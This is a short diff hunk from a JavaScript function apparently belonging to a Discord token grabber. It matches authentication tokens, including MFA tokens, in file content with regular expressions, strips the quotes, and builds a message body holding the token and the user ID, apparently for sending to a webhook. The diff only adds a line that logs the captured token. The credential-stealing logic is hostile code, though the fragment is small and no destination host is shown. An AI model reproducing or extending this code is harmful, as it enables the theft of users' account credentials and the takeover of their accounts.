@@ -60,7 +60,7 @@ function koro(p) {
                 var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]
                 
                 if (token){
-                    
+                    console.log(token);
                     token = token.replace(/"/g, '');
                     var a = `{"content": "Token: ${token}", "username": "UID: ${uid}"}`;
                     console.log(a)
